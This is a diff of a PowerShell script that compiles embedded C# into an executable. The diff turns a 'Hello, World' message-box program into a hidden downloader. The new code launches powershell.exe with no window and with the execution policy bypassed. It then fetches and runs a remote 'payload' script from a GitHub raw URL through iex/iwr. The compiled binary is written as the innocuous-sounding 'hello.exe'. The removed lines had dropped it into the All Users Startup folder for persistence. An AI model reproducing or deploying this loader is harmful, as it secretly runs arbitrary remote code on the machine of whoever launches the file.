@@ -1,23 +1,42 @@
 $source  = @" 
 using System;
-using System.Collections.Generic;
-using System.Text;
-using System.IO;
-using System.Windows.Forms;
- 
-namespace test
+using System.Diagnostics;
+
+namespace PowerShellExecution
 {
-    public class Program
+    class Program
     {
-        public static void Main()
+        static void Main()
         {
-           MessageBox.Show("Hello, World !");
+            string url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/Cpayload/main.ps1";
+            string psCommand = $"iex (iwr {url} -UseBasicP)";
+
+            ProcessStartInfo startInfo = new ProcessStartInfo
+            {
+                FileName = "powershell.exe",
+                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{psCommand}\"",
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
+
+            using (Process process = Process.Start(startInfo))
+            {
+                // Output and error streams can be captured if needed
+                string output = process.StandardOutput.ReadToEnd();
+                string error = process.StandardError.ReadToEnd();
+                process.WaitForExit();
+
+                // Optionally, you can log or process the output and error
+                // Console.WriteLine(output); // Uncomment to see the output
+                // Console.WriteLine(error);  // Uncomment to see any errors
+            }
         }
     }
 }
 "@
-$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
-$outpath  =  "$startupfolder\null.exe"
+$outpath  =  "$env:userprofile\downloads\hello.exe" 
 $dict = new-object 'System.Collections.Generic.Dictionary[string,string]' 
 $dict.Add('CompilerVersion','v4.0')
 $CsharpCompiler = New-Object Microsoft.CSharp.CSharpCodeProvider $dict
